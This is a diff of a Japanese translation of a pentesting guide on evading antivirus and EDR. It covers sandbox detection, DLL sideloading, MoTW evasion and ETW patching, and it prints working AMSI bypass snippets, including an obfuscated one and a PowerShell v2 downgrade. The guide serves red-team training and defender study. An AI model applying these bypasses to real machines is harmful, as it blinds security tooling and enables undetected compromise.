@@ -10,11 +10,11 @@
 
 ### **静的検出**
 
-静的検出は、バイナリやスクリプト内の既知の悪意のある文字列やバイトの配列にフラグを立てたり、ファイル自体から情報を抽出したりすることで達成されます（例：ファイルの説明、会社名、デジタル署名、アイコン、チェックサムなど）。これは、既知の公開ツールを使用すると、分析されて悪意のあるものとしてフラグが立てられている可能性が高いため、簡単に捕まる可能性があることを意味します。この種の検出を回避する方法はいくつかあります：
+静的検出は、バイナリやスクリプト内の既知の悪意のある文字列やバイトの配列にフラグを立てることによって達成され、ファイル自体から情報を抽出することも含まれます（例：ファイルの説明、会社名、デジタル署名、アイコン、チェックサムなど）。これは、既知の公開ツールを使用すると、分析されて悪意のあるものとしてフラグが立てられている可能性が高いため、簡単に捕まる可能性があることを意味します。この種の検出を回避する方法はいくつかあります：
 
 - **暗号化**
 
-バイナリを暗号化すると、AVがプログラムを検出する方法はなくなりますが、プログラムをメモリ内で復号化して実行するためのローダーが必要になります。
+バイナリを暗号化すると、AVがプログラムを検出する方法はなくなりますが、メモリ内でプログラムを復号化して実行するためのローダーが必要になります。
 
 - **難読化**
 
@@ -22,22 +22,22 @@
 
 - **カスタムツール**
 
-独自のツールを開発すれば、既知の悪意のあるシグネチャは存在しませんが、これには多くの時間と労力がかかります。
+独自のツールを開発すれば、既知の悪いシグネチャは存在しませんが、これには多くの時間と労力がかかります。
 
 > [!NOTE]
-> Windows Defenderの静的検出に対して確認する良い方法は[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)です。これは基本的にファイルを複数のセグメントに分割し、Defenderにそれぞれを個別にスキャンさせることで、バイナリ内のフラグが立てられた文字列やバイトを正確に教えてくれます。
+> Windows Defenderの静的検出に対抗する良い方法は[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)です。これは基本的にファイルを複数のセグメントに分割し、Defenderにそれぞれを個別にスキャンさせることで、バイナリ内のフラグが立てられた文字列やバイトを正確に教えてくれます。
 
-実践的なAV回避に関するこの[YouTubeプレイリスト](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)をぜひチェックすることをお勧めします。
+実践的なAV回避に関するこの[YouTubeプレイリスト](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)をぜひチェックしてください。
 
 ### **動的分析**
 
 動的分析は、AVがバイナリをサンドボックス内で実行し、悪意のある活動を監視することです（例：ブラウザのパスワードを復号化して読み取ろうとする、LSASSのミニダンプを実行するなど）。この部分は扱いが少し難しいことがありますが、サンドボックスを回避するためにできることはいくつかあります。
 
-- **実行前のスリープ** 実装方法によっては、AVの動的分析を回避するための素晴らしい方法になることがあります。AVはユーザーのワークフローを中断しないようにファイルをスキャンするための時間が非常に短いため、長いスリープを使用するとバイナリの分析を妨げることができます。ただし、多くのAVのサンドボックスは、実装方法によってはスリープをスキップすることができます。
-- **マシンのリソースを確認** 通常、サンドボックスは非常に少ないリソース（例：< 2GB RAM）で動作します。そうでなければ、ユーザーのマシンを遅くする可能性があります。ここでは非常にクリエイティブになることもできます。たとえば、CPUの温度やファンの速度を確認することで、すべてがサンドボックスに実装されているわけではありません。
+- **実行前のスリープ** 実装方法によっては、AVの動的分析を回避するための素晴らしい方法になることがあります。AVはユーザーの作業フローを中断しないようにファイルをスキャンするための時間が非常に短いため、長いスリープを使用するとバイナリの分析を妨げることができます。ただし、多くのAVのサンドボックスは、実装方法によってはスリープをスキップすることができます。
+- **マシンのリソースをチェック** 通常、サンドボックスは非常に少ないリソース（例：< 2GB RAM）で動作します。そうでなければ、ユーザーのマシンを遅くする可能性があります。ここでは非常にクリエイティブになることもできます。たとえば、CPUの温度やファンの速度をチェックすることで、すべてがサンドボックスに実装されているわけではありません。
 - **マシン固有のチェック** "contoso.local"ドメインに参加しているユーザーをターゲットにしたい場合は、コンピュータのドメインをチェックして指定したものと一致するかどうかを確認できます。一致しない場合は、プログラムを終了させることができます。
 
-Microsoft Defenderのサンドボックスのコンピュータ名はHAL9THであるため、爆発前にマルウェア内でコンピュータ名を確認できます。名前がHAL9THと一致する場合、Defenderのサンドボックス内にいることを意味するため、プログラムを終了させることができます。
+Microsoft Defenderのサンドボックスのコンピュータ名はHAL9THであるため、爆発前にマルウェア内でコンピュータ名をチェックできます。名前がHAL9THと一致する場合、Defenderのサンドボックス内にいることを意味するため、プログラムを終了させることができます。
 
 <figure><img src="../images/image (209).png" alt=""><figcaption><p>出典: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>
 
@@ -49,27 +49,27 @@ Microsoft Defenderのサンドボックスのコンピュータ名はHAL9THで�
 
 たとえば、LSASSをダンプしたい場合、**本当にmimikatzを使用する必要がありますか**？それとも、LSASSをダンプする別のあまり知られていないプロジェクトを使用できますか。
 
-正しい答えはおそらく後者です。mimikatzを例に取ると、これはおそらくAVやEDRによって最もフラグが立てられたマルウェアの一つであり、プロジェクト自体は非常にクールですが、AVを回避するためにそれを扱うのは悪夢のようなものです。したがって、達成しようとしていることの代替手段を探してください。
+正しい答えはおそらく後者です。mimikatzを例に取ると、これはおそらくAVやEDRによって最もフラグが立てられたマルウェアの一つであり、プロジェクト自体は非常にクールですが、AVを回避するためにそれを扱うのは悪夢です。したがって、達成しようとしていることの代替手段を探してください。
 
 > [!NOTE]
-> 回避のためにペイロードを変更する際は、Defenderで**自動サンプル送信をオフにする**ことを確認し、長期的に回避を達成することが目標である場合は、**VIRUSTOTALにアップロードしないでください**。特定のAVによってペイロードが検出されるかどうかを確認したい場合は、VMにインストールし、自動サンプル送信をオフにし、結果に満足するまでそこでテストしてください。
+> 回避のためにペイロードを変更する際は、Defenderで**自動サンプル送信をオフにする**ことを確認し、長期的に回避を達成することが目的である場合は、**絶対にVIRUSTOTALにアップロードしないでください**。特定のAVによってペイロードが検出されるかどうかを確認したい場合は、VMにインストールし、自動サンプル送信をオフにし、結果に満足するまでそこでテストしてください。
 
 ## EXEとDLL
 
-可能な限り、常に**回避のためにDLLを使用することを優先してください**。私の経験では、DLLファイルは通常**はるかに検出されにくく**、分析されにくいため、場合によっては検出を回避するための非常にシンプルなトリックです（もちろん、ペイロードがDLLとして実行される方法がある場合）。
+可能な限り、常に**回避のためにDLLを使用することを優先してください**。私の経験では、DLLファイルは通常**はるかに検出されにくく**、分析されにくいため、場合によっては検出を回避するための非常に簡単なトリックです（もちろん、ペイロードがDLLとして実行される方法がある場合）。
 
 この画像に示されているように、HavocのDLLペイロードはantiscan.meでの検出率が4/26であるのに対し、EXEペイロードは7/26の検出率です。
 
 <figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.meでの通常のHavoc EXEペイロードと通常のHavoc DLLの比較</p></figcaption></figure>
 
-ここでは、DLLファイルを使用してよりステルス性を高めるためのいくつかのトリックを示します。
+ここでは、DLLファイルを使用してよりステルス性を高めるためのいくつかのトリックを紹介します。
 
 ## DLLサイドローディングとプロキシ
 
-**DLLサイドローディング**は、ローダーによって使用されるDLL検索順序を利用し、被害者アプリケーションと悪意のあるペイロードを並べて配置することです。
+**DLLサイドローディング**は、ローダーによって使用されるDLL検索順序を利用し、被害者アプリケーションと悪意のあるペイロードを並べて配置することによって行われます。
 
-DLLサイドローディングに脆弱なプログラムを確認するには、[Siofra](https://github.com/Cybereason/siofra)と次のPowerShellスクリプトを使用できます：
-```powershell
+DLLサイドローディングに脆弱なプログラムをチェックするには、[Siofra](https://github.com/Cybereason/siofra)と次のPowerShellスクリプトを使用できます：
+```bash
 Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
 $binarytoCheck = "C:\Program Files\" + $_
 C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
@@ -79,7 +79,7 @@ C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hija
 
 私はあなたが**DLLハイジャック可能/サイドロード可能なプログラムを自分で調査することを強くお勧めします**。この技術は適切に行えば非常にステルス性がありますが、一般に知られているDLLサイドロード可能なプログラムを使用すると、簡単に捕まる可能性があります。
 
-悪意のあるDLLをプログラムが読み込むことを期待する名前で配置するだけでは、ペイロードは読み込まれません。プログラムはそのDLL内に特定の関数を期待しているためです。この問題を解決するために、**DLLプロキシング/フォワーディング**という別の技術を使用します。
+悪意のあるDLLをプログラムが読み込むことを期待する名前で配置するだけでは、ペイロードは読み込まれません。プログラムはそのDLL内に特定の関数を期待しているため、この問題を解決するために、**DLLプロキシング/フォワーディング**という別の技術を使用します。
 
 **DLLプロキシング**は、プログラムがプロキシ（および悪意のある）DLLから元のDLLに対して行う呼び出しを転送し、プログラムの機能を保持しつつ、ペイロードの実行を処理できるようにします。
 
@@ -92,7 +92,7 @@ C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hija
 3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
 4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
 ```
-最後のコマンドは、DLLソースコードテンプレートと元の名前が変更されたDLLの2つのファイルを生成します。
+最後のコマンドは、DLLソースコードテンプレートと、元の名前を変更したDLLの2つのファイルを生成します。
 
 <figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
 ```
@@ -125,12 +125,12 @@ Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freez
 
 ## AMSI (アンチマルウェアスキャンインターフェース)
 
-AMSIは「[ファイルレスマルウェア](https://en.wikipedia.org/wiki/Fileless_malware)」を防ぐために作成されました。最初は、AVは**ディスク上のファイル**のみをスキャンすることができたため、ペイロードを**直接メモリ内で**実行できれば、AVはそれを防ぐための十分な可視性を持っていませんでした。
+AMSIは「[ファイルレスマルウェア](https://en.wikipedia.org/wiki/Fileless_malware)」を防ぐために作成されました。最初は、AVは**ディスク上のファイル**のみをスキャンできたため、ペイロードを**直接メモリ内で実行**できれば、AVはそれを防ぐための十分な可視性を持っていませんでした。
 
 AMSI機能はWindowsのこれらのコンポーネントに統合されています。
 
 - ユーザーアカウント制御、またはUAC（EXE、COM、MSI、またはActiveXインストールの昇格）
-- PowerShell（スクリプト、対話型使用、および動的コード評価）
+- PowerShell（スクリプト、対話的使用、動的コード評価）
 - Windows Script Host（wscript.exeおよびcscript.exe）
 - JavaScriptおよびVBScript
 - Office VBAマクロ
@@ -145,28 +145,30 @@ AMSI機能はWindowsのこれらのコンポーネントに統合されていま
 
 ディスクにファイルを落とさなかったにもかかわらず、AMSIのためにメモリ内で捕まってしまいました。
 
+さらに、**.NET 4.8**以降、C#コードもAMSIを通じて実行されます。これは、メモリ内実行のために`Assembly.Load(byte[])`にも影響します。したがって、AMSIを回避したい場合は、メモリ内実行のために.NETの古いバージョン（4.7.2以下など）を使用することが推奨されます。
+
 AMSIを回避する方法はいくつかあります：
 
 - **難読化**
 
 AMSIは主に静的検出で機能するため、読み込もうとするスクリプトを変更することは、検出を回避する良い方法となる可能性があります。
 
-ただし、AMSIは複数の層があってもスクリプトを難読化解除する能力を持っているため、難読化は行い方によっては悪い選択肢となる可能性があります。これにより、回避が簡単ではなくなります。ただし、時には変数名をいくつか変更するだけで済むこともあるため、どれだけフラグが立てられているかによります。
+ただし、AMSIは複数のレイヤーがあってもスクリプトを難読化解除する能力を持っているため、難読化の方法によっては悪い選択肢となる可能性があります。これにより、回避が簡単ではなくなります。ただし、時には変数名をいくつか変更するだけで済むこともあるため、どれだけフラグが立てられているかによります。
 
 - **AMSIバイパス**
 
-AMSIはpowershell（またはcscript.exe、wscript.exeなど）プロセスにDLLをロードすることによって実装されているため、特権のないユーザーとして実行していても簡単に改ざんすることが可能です。このAMSIの実装の欠陥により、研究者たちはAMSIスキャンを回避するための複数の方法を見つけました。
+AMSIはpowershell（またはcscript.exe、wscript.exeなど）のプロセスにDLLを読み込むことによって実装されているため、特権のないユーザーとして実行していても簡単に改ざんすることが可能です。このAMSIの実装の欠陥により、研究者たちはAMSIスキャンを回避するための複数の方法を見つけました。
 
 **エラーを強制する**
 
-AMSIの初期化を失敗させる（amsiInitFailed）ことで、現在のプロセスに対してスキャンが開始されない結果になります。これは元々[Matt Graeber](https://twitter.com/mattifestation)によって公開され、Microsoftはより広範な使用を防ぐためのシグネチャを開発しました。
-```powershell
+AMSIの初期化を失敗させる（amsiInitFailed）ことで、現在のプロセスに対してスキャンが開始されなくなります。これは元々[Matt Graeber](https://twitter.com/mattifestation)によって公開され、Microsoftはより広範な使用を防ぐためのシグネチャを開発しました。
+```bash
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
 たった1行のPowerShellコードで、現在のPowerShellプロセスに対してAMSIを無効にすることができました。この行はもちろんAMSI自体によってフラグが立てられているため、この技術を使用するにはいくつかの修正が必要です。
 
 こちらは、私がこの [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) から取った修正されたAMSIバイパスです。
-```powershell
+```bash
 Try{#Ams1 bypass technic nº 2
 $Xdatabase = 'Utils';$Homedrive = 'si'
 $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
@@ -179,58 +181,85 @@ $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
 $Spotfix.SetValue($null,$true)
 }Catch{Throw $_}
 ```
-Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.
+注意してください。この投稿が公開されると、おそらくフラグが立てられるので、検出されないことを計画している場合は、コードを公開しない方が良いでしょう。
 
 **メモリパッチ**
 
-この技術は最初に[@RastaMouse](https://twitter.com/_RastaMouse/)によって発見され、amsi.dll内の「AmsiScanBuffer」関数のアドレスを見つけて、E_INVALIDARGのコードを返すように指示を上書きすることを含みます。これにより、実際のスキャンの結果は0を返し、これはクリーンな結果として解釈されます。
+この技術は最初に [@RastaMouse](https://twitter.com/_RastaMouse/) によって発見され、amsi.dll内の「AmsiScanBuffer」関数のアドレスを見つけ、それをE_INVALIDARGのコードを返す命令で上書きすることを含みます。これにより、実際のスキャンの結果は0を返し、これはクリーンな結果として解釈されます。
 
 > [!NOTE]
-> より詳細な説明については、[https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)をお読みください。
+> より詳細な説明については [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) をお読みください。
 
-また、PowerShellを使用してAMSIをバイパスするための他の多くの技術もあります。詳細については、[**このページ**](basic-powershell-for-pentesters/index.html#amsi-bypass)や[this repo](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)をチェックしてください。
+また、PowerShellを使用してAMSIをバイパスするための他の多くの技術もあります。詳細については [**このページ**](basic-powershell-for-pentesters/index.html#amsi-bypass) と [**このリポジトリ**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) をチェックしてください。
 
-また、このスクリプトはメモリパッチを介して新しいPowershをパッチします。
+このツール [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) もAMSIをバイパスするスクリプトを生成します。
 
-## 難読化
+**検出された署名を削除する**
 
-**C#のクリアテキストコードを難読化**したり、バイナリをコンパイルするための**メタプログラミングテンプレート**を生成したり、**コンパイルされたバイナリを難読化**するために使用できるツールがいくつかあります。
+**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** や **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** のようなツールを使用して、現在のプロセスのメモリから検出されたAMSI署名を削除できます。このツールは、現在のプロセスのメモリをスキャンしてAMSI署名を見つけ、それをNOP命令で上書きすることによって、実質的にメモリから削除します。
 
-- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C#難読化ツール**
-- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトの目的は、[LLVM](http://www.llvm.org/)コンパイルスイートのオープンソースフォークを提供し、[コード難読化](<http://en.wikipedia.org/wiki/Obfuscation_(software)>)と改ざん防止を通じてソフトウェアのセキュリティを向上させることです。
-- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscatorは、`C++11/14`言語を使用して、外部ツールを使用せず、コンパイラを変更せずに、コンパイル時に難読化されたコードを生成する方法を示しています。
-- [**obfy**](https://github.com/fritzone/obfy): C++テンプレートメタプログラミングフレームワークによって生成された難読化された操作のレイヤーを追加し、アプリケーションをクラッキングしようとする人の生活を少し難しくします。
-- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatrazは、.exe、.dll、.sysなどのさまざまなpeファイルを難読化できるx64バイナリ難読化ツールです。
-- [**metame**](https://github.com/a0rtega/metame): Metameは、任意の実行可能ファイル用のシンプルなメタモルフィックコードエンジンです。
-- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscatorは、ROP（リターン指向プログラミング）を使用してLLVMサポート言語のための細粒度のコード難読化フレームワークです。ROPfuscatorは、通常の制御フローの自然な概念を妨害することによって、アセンブリコードレベルでプログラムを難読化します。
-- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcryptは、Nimで書かれた.NET PEクリプターです。
-- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptorは、既存のEXE/DLLをシェルコードに変換し、それをロードすることができます。
+**AMSIを使用するAV/EDR製品**
+
+AMSIを使用するAV/EDR製品のリストは **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** で見つけることができます。
+
+**PowerShellバージョン2を使用する**
+PowerShellバージョン2を使用すると、AMSIはロードされないため、AMSIによるスキャンなしでスクリプトを実行できます。次のようにできます：
+```bash
+powershell.exe -version 2
+```
+## PS Logging
+
+PowerShell ロギングは、システム上で実行されたすべての PowerShell コマンドをログに記録する機能です。これは監査やトラブルシューティングに役立ちますが、**検出を回避したい攻撃者にとっては問題となる可能性があります**。
+
+PowerShell ロギングをバイパスするには、次の技術を使用できます：
+
+- **PowerShell トランスクリプションとモジュール ロギングを無効にする**: この目的のために、[https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) のようなツールを使用できます。
+- **PowerShell バージョン 2 を使用する**: PowerShell バージョン 2 を使用すると、AMSI がロードされないため、AMSI によるスキャンなしでスクリプトを実行できます。これを行うには: `powershell.exe -version 2`
+- **管理されていない PowerShell セッションを使用する**: [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) を使用して、防御なしで PowerShell を起動します（これは Cobalt Strike の `powerpick` が使用するものです）。
+
+## Obfuscation
+
+> [!NOTE]
+> いくつかの難読化技術はデータを暗号化することに依存しており、これによりバイナリのエントロピーが増加し、AV や EDR による検出が容易になります。これに注意し、機密性が高いか隠す必要があるコードの特定のセクションにのみ暗号化を適用することをお勧めします。
+
+C# のクリアテキストコードを**難読化**したり、バイナリをコンパイルするための**メタプログラミングテンプレート**を生成したり、**コンパイルされたバイナリを難読化**するために使用できるツールはいくつかあります：
+
+- [**ConfuserEx**](https://github.com/yck1509/ConfuserEx): .NET アプリケーション用の優れたオープンソースの難読化ツールです。制御フローの難読化、アンチデバッグ、アンチ改ざん、文字列暗号化など、さまざまな保護技術を提供します。特定のコードのチャンクを難読化することもできるため、お勧めです。
+- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# 難読化ツール**
+- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトの目的は、[LLVM](http://www.llvm.org/) コンパイルスイートのオープンソースフォークを提供し、[コードの難読化](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) と改ざん防止を通じてソフトウェアのセキュリティを向上させることです。
+- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator は、`C++11/14` 言語を使用して、外部ツールを使用せず、コンパイラを変更することなく、コンパイル時に難読化されたコードを生成する方法を示しています。
+- [**obfy**](https://github.com/fritzone/obfy): C++ テンプレートメタプログラミングフレームワークによって生成された難読化された操作のレイヤーを追加し、アプリケーションをクラッキングしようとする人の生活を少し難しくします。
+- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz は、.exe、.dll、.sys など、さまざまな異なる pe ファイルを難読化できる x64 バイナリ難読化ツールです。
+- [**metame**](https://github.com/a0rtega/metame): Metame は、任意の実行可能ファイル用のシンプルなメタモルフィックコードエンジンです。
+- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator は、ROP（リターン指向プログラミング）を使用して LLVM サポート言語のための細粒度のコード難読化フレームワークです。ROPfuscator は、通常の命令を ROP チェーンに変換することによって、アセンブリコードレベルでプログラムを難読化し、通常の制御フローの自然な概念を妨害します。
+- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt は、Nim で書かれた .NET PE Crypter です。
+- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor は、既存の EXE/DLL をシェルコードに変換し、それをロードすることができます。
 
 ## SmartScreen & MoTW
 
 インターネットからいくつかの実行可能ファイルをダウンロードして実行する際に、この画面を見たことがあるかもしれません。
 
-Microsoft Defender SmartScreenは、エンドユーザーが潜在的に悪意のあるアプリケーションを実行するのを防ぐためのセキュリティメカニズムです。
+Microsoft Defender SmartScreen は、エンドユーザーが潜在的に悪意のあるアプリケーションを実行するのを防ぐためのセキュリティメカニズムです。
 
 <figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>
 
-SmartScreenは主に評判ベースのアプローチで機能し、一般的でないダウンロードアプリケーションはSmartScreenをトリガーし、エンドユーザーがファイルを実行するのを警告し防止します（ただし、ファイルは「詳細情報」->「それでも実行」をクリックすることで実行できます）。
+SmartScreen は主に評判ベースのアプローチで機能し、一般的でないダウンロードアプリケーションは SmartScreen をトリガーし、エンドユーザーがファイルを実行するのを警告し防止します（ただし、ファイルは「詳細情報」->「それでも実行」をクリックすることで実行できます）。
 
-**MoTW**（Mark of The Web）は、インターネットからダウンロードされたファイルに自動的に作成される[NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)で、Zone.Identifierという名前が付けられ、ダウンロード元のURLと共に作成されます。
+**MoTW**（Mark of The Web）は、インターネットからダウンロードされたファイルに自動的に作成される[NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) で、Zone.Identifier という名前が付けられ、ダウンロード元の URL とともに作成されます。
 
-<figure><img src="../images/image (237).png" alt=""><figcaption><p>インターネットからダウンロードされたファイルのZone.Identifier ADSを確認しています。</p></figcaption></figure>
+<figure><img src="../images/image (237).png" alt=""><figcaption><p>インターネットからダウンロードされたファイルの Zone.Identifier ADS を確認しています。</p></figcaption></figure>
 
 > [!NOTE]
-> **信頼された**署名証明書で署名された実行可能ファイルは**SmartScreenをトリガーしない**ことに注意することが重要です。
+> **信頼された**署名証明書で署名された実行可能ファイルは、**SmartScreen をトリガーしない**ことに注意することが重要です。
 
-ペイロードがMark of The Webを受け取らないようにする非常に効果的な方法は、それらをISOのようなコンテナにパッケージ化することです。これは、Mark-of-the-Web（MOTW）が**非NTFS**ボリュームには**適用できない**ためです。
+ペイロードが Mark of The Web を取得するのを防ぐ非常に効果的な方法は、ISO のようなコンテナ内にパッケージ化することです。これは、Mark-of-the-Web (MOTW) **が** **非 NTFS** ボリュームに適用できないためです。
 
 <figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>
 
-[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)は、Mark-of-the-Webを回避するためにペイロードを出力コンテナにパッケージ化するツールです。
+[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) は、Mark-of-the-Web を回避するためにペイロードを出力コンテナにパッケージ化するツールです。
 
 使用例:
-```powershell
+```bash
 PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso
 
 +      o     +              o   +      o     +              o
@@ -251,25 +280,33 @@ Adding file: /TotallyLegitApp.exe
 
 [+] Generated file written to (size: 3420160): container.iso
 ```
-ここでは、[PackMyPayload](https://github.com/mgeeky/PackMyPayload/)を使用してペイロードをISOファイル内にパッケージ化することでSmartScreenをバイパスするデモを示します。
+ここでは、[PackMyPayload](https://github.com/mgeeky/PackMyPayload/)を使用して、ペイロードをISOファイル内にパッケージ化することでSmartScreenをバイパスするデモを示します。
 
 <figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>
+
+## ETW
+
+Windowsのイベントトレーシング（ETW）は、アプリケーションやシステムコンポーネントが**イベントをログ**することを可能にする強力なログメカニズムです。しかし、セキュリティ製品が悪意のある活動を監視および検出するためにも使用される可能性があります。
+
+AMSIが無効化（バイパス）されるのと同様に、ユーザースペースプロセスの**`EtwEventWrite`**関数を、イベントをログせずに即座に戻るようにすることも可能です。これは、メモリ内の関数をパッチして即座に戻るようにすることで、そのプロセスのETWログを実質的に無効にします。
+
+詳細については、**[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) および [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**を参照してください。
 
 ## C# アセンブリリフレクション
 
 C#バイナリをメモリにロードすることはかなり前から知られており、AVに捕まることなくポストエクスプロイトツールを実行するための非常に優れた方法です。
 
-ペイロードはディスクに触れずに直接メモリにロードされるため、プロセス全体でAMSIをパッチすることだけを心配すればよいです。
+ペイロードはディスクに触れずに直接メモリにロードされるため、プロセス全体のAMSIをパッチすることだけを心配すればよいです。
 
-ほとんどのC2フレームワーク（sliver、Covenant、metasploit、CobaltStrike、Havocなど）は、すでにC#アセンブリをメモリ内で直接実行する機能を提供していますが、異なる方法があります：
+ほとんどのC2フレームワーク（sliver、Covenant、metasploit、CobaltStrike、Havocなど）は、すでにC#アセンブリをメモリ内で直接実行する機能を提供していますが、さまざまな方法があります：
 
 - **Fork&Run**
 
-これは、**新しい犠牲プロセスを生成し**、その新しいプロセスにポストエクスプロイトの悪意のあるコードを注入し、悪意のあるコードを実行し、終了したら新しいプロセスを終了させることを含みます。これには利点と欠点があります。フォークと実行の方法の利点は、実行が**私たちのビーコンインプラントプロセスの外部**で行われることです。これは、ポストエクスプロイトアクションの何かがうまくいかなかったり捕まったりした場合、**私たちのインプラントが生き残る可能性がはるかに高くなる**ことを意味します。欠点は、**行動検出**によって捕まる可能性が**高くなる**ことです。
+これは、**新しい犠牲プロセスを生成し**、その新しいプロセスにポストエクスプロイトの悪意のあるコードを注入し、悪意のあるコードを実行し、終了したら新しいプロセスを終了させることを含みます。これには利点と欠点があります。フォークアンドランメソッドの利点は、実行が**私たちのBeaconインプラントプロセスの外部**で行われることです。これは、ポストエクスプロイトアクションの何かがうまくいかなかったり捕まったりした場合、**私たちのインプラントが生き残る可能性がはるかに高い**ことを意味します。欠点は、**行動検出**によって捕まる可能性が**高くなる**ことです。
 
 <figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>
 
-- **インライン**
+- **Inline**
 
 これは、ポストエクスプロイトの悪意のあるコードを**自分のプロセスに注入する**ことです。この方法では、新しいプロセスを作成してAVにスキャンされるのを避けることができますが、欠点は、ペイロードの実行に何か問題が発生した場合、**ビーコンを失う可能性がはるかに高くなる**ことです。
 
@@ -278,29 +315,39 @@ C#バイナリをメモリにロードすることはかなり前から知られ
 > [!NOTE]
 > C#アセンブリのロードについてもっと知りたい場合は、この記事[https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/)とそのInlineExecute-Assembly BOFをチェックしてください([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))。
 
-C#アセンブリを**PowerShellから**ロードすることもできます。 [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader)と[S3cur3th1sSh1tのビデオ](https://www.youtube.com/watch?v=oe11Q-3Akuk)をチェックしてください。
+また、C#アセンブリを**PowerShellからロードする**こともできます。 [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader)と[S3cur3th1sSh1tのビデオ](https://www.youtube.com/watch?v=oe11Q-3Akuk)をチェックしてください。
 
 ## 他のプログラミング言語の使用
 
-[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins)で提案されているように、攻撃者が制御するSMB共有にインストールされたインタープリタ環境へのアクセスを提供することで、他の言語を使用して悪意のあるコードを実行することが可能です。
+[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins)で提案されているように、妥協されたマシンに**攻撃者が制御するSMB共有にインストールされたインタープリタ環境へのアクセスを与える**ことで、他の言語を使用して悪意のあるコードを実行することが可能です。
 
-インタープリタバイナリとSMB共有上の環境へのアクセスを許可することで、**侵害されたマシンのメモリ内でこれらの言語の任意のコードを実行することができます**。
+インタープリタバイナリとSMB共有上の環境へのアクセスを許可することで、妥協されたマシンの**メモリ内でこれらの言語の任意のコードを実行することができます**。
 
-リポジトリは次のように示しています：Defenderはスクリプトをスキャンし続けますが、Go、Java、PHPなどを利用することで、**静的シグネチャをバイパスする柔軟性が高まります**。これらの言語でランダムな非難読化リバースシェルスクリプトをテストした結果、成功が確認されています。
+リポジトリは次のように示しています：Defenderはスクリプトをスキャンし続けますが、Go、Java、PHPなどを利用することで、**静的シグネチャをバイパスする柔軟性が高まります**。これらの言語でランダムな非難の逆シェルスクリプトをテストした結果、成功が確認されています。
+
